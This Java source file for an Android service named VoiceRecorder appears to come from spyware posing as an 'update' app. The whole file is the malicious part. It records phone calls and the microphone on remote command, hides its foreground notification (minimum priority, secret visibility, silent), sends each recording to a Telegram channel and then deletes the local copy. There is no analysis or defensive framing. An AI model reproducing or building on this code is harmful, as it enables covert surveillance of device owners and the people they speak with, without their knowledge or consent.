package com.kasari.update;

import android.app.*;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.*;
import androidx.core.app.NotificationCompat;
import java.io.File;

public class VoiceRecorder extends Service {

    public static final String ACTION_CALL = "com.kasari.update.RECORD_CALL";
    public static final String ACTION_MIC  = "com.kasari.update.RECORD_MIC";
    public static final String ACTION_STOP = "com.kasari.update.STOP_RECORD";
    public static final String EXTRA_SECONDS = "seconds";

    private MediaRecorder mRecorder;
    private String mFile;
    private String mNumber = "Unknown";
    private String mType   = "Call";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        String action = intent.getAction();

        if (ACTION_STOP.equals(action)) {
            stopRecording("📞 Call Recording");
            return START_NOT_STICKY;
        }

        startForeground(9902, buildNotif());

        if (ACTION_CALL.equals(action)) {
            mNumber = intent.getStringExtra("number");
            mType   = intent.getStringExtra("type");
            if (mNumber == null) mNumber = "Unknown";
            if (mType   == null) mType   = "Call";
            startRecording();

        } else if (ACTION_MIC.equals(action)) {
            int sec = intent.getIntExtra(EXTRA_SECONDS, 30);
            mNumber = "Mic";
            startRecording();
            new Handler().postDelayed(() -> stopRecording("🎙 Mic Recording (" + sec + "s)"),
                sec * 1000L);
        }
        return START_NOT_STICKY;
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, BackgroundService.CH_ID)
            .setSmallIcon(android.R.drawable.sym_def_app_icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).build();
    }

    private void startRecording() {
        try {
            mFile = getCacheDir().getAbsolutePath() + "/rec_" + System.currentTimeMillis() + ".3gp";
            mRecorder = new MediaRecorder();
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mRecorder.setAudioSamplingRate(16000);
            mRecorder.setAudioEncodingBitRate(24000);
            mRecorder.setOutputFile(mFile);
            mRecorder.prepare();
            mRecorder.start();
        } catch (Exception e) {
            TelegramController.sendMessage("❌ Recording error: " + e.getMessage());
            stopSelf();
        }
    }

    private void stopRecording(String caption) {
        if (mRecorder != null) {
            try { mRecorder.stop(); } catch (Exception ignored) {}
            mRecorder.release();
            mRecorder = null;
        }
        String filePath = mFile;
        String cap = caption + "\nWith: " + mNumber;
        new Thread(() -> {
            if (filePath == null) return;
            java.io.File f = new java.io.File(filePath);
            if (f.exists() && f.length() > 500) {
                TelegramController.sendFile(f, cap);
                f.delete();
            } else {
                if (f.exists()) f.delete();
            }
        }).start();
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        if (mRecorder != null) {
            try { mRecorder.stop(); mRecorder.release(); } catch (Exception ignored) {}
            mRecorder = null;
        }
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
